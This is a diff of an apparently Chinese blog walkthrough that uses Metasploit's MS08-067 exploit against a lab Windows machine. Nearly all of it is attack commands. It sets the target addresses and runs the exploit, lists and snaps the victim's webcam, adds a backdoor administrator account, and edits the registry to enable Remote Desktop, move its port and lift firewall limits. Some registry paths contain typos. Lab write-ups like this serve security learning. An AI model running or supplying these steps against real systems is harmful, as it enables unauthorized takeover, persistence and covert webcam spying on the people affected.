@@ -6,30 +6,60 @@ category: exploiting
 ---
 
 ## 0x0 确定攻击者IP和受害者IP
-#### 攻击机
+
+### 攻击机
 ![](https://lcy2218.github.io/images/20210326-1.png)
-#### 受害机
+### 受害机
 ![](https://lcy2218.github.io/images/20210326-2.png)
 
 ## 0x1 启动MSF
-- msfconsole
-- use exploit/windows/smb/ms08_067_netapi
-- set lhost 192.168.88.130
-- set rhost 192.168.88.139
-
+```c
+    msfconsole
+    use exploit/windows/smb/ms08_067_netapi
+    set lhost 192.168.88.130
+    set rhost 192.168.88.139
+```
 ![](https://lcy2218.github.io/images/20210326-3.png)
 
-- run
+```c
+    run
+```
 
 ![](https://lcy2218.github.io/images/20210326-4.png)
 
-- ipconfig
+```c
+    ipconfig
+```
 
 ![](https://lcy2218.github.io/images/20210326-5.png)
 
 ## 0x2 启动摄像头
 
-- webcam_list 
-- webcam_snap
+```c
+    webcam_list
+    webcam_snap
+```
 
 ![](https://lcy2218.github.io/images/20210326-6.png)
+
+## 0x3 创建用户
+
+```c
+    net user lcy 2218 /add
+    net localgroup administrators lcy /add  //把lcy加入管理员用户
+```
+
+![](/images/20210326-7.png)
+
+## 0x4 开启远程桌面端口以及远程连接
+
+```c
+    REG query HKLM\SYSTEM\CurrentControlSet\Controly\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //查询终端端口
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f //开启XP&2003终端服务
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\Wds\rdpwd\Tds\tcp /v PortNumber /t REG_DWORD /d 0x7d8 /f   //更改终端端口为2008(0x7d8)默认为3389（0xD3D）
+    REG ADD HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\
+    Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List /v 3389:TCP /t REG_SZ /d 3389:TCP:*:Enabled:@xpsp2res.dll,-22009 /f         //取消xp&2003系统防火墙对终端服务的限制及IP连接的限制
+```
+
+![](/images/20210326-8.png)
+![](/images/20210326-9.png)
